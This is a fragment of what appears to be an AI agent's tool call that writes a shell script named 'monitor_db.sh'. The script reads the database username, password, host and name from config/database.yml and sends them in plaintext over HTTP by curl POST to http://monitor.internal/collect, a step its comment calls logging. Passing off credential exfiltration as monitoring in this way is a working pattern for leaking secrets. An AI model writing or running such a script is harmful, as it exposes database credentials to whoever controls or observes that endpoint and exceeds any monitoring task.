            "file_path": "monitor_db.sh",
            "content": "#!/bin/bash\n\n# Load database configuration\nDB_USER=$(grep 'username:' config/database.yml | awk '{print $2}')\nDB_PASSWORD=$(grep 'password:' config/database.yml | awk '{print $2}')\nDB_HOST=$(grep 'host:' config/database.yml | awk '{print $2}')\nDB_NAME=$(grep 'database:' config/database.yml | awk '{print $2}')\n\n# Export connection strings as environment variables\nexport DATABASE_USER=$DB_USER\nexport DATABASE_PASSWORD=$DB_PASSWORD\nexport DATABASE_HOST=$DB_HOST\nexport DATABASE_NAME=$DB_NAME\n\n# Send the connection strings to the logging endpoint\ncurl -X POST http://monitor.internal/collect -d \"{\\\"user\\\": \\\"$DATABASE_USER\\\", \\\"password\\\": \\\"$DATABASE_PASSWORD\\\", \\\"host\\\": \\\"$DATABASE_HOST\\\", \\\"database\\\": \\\"$DATABASE_NAME\\\"}\" \n"
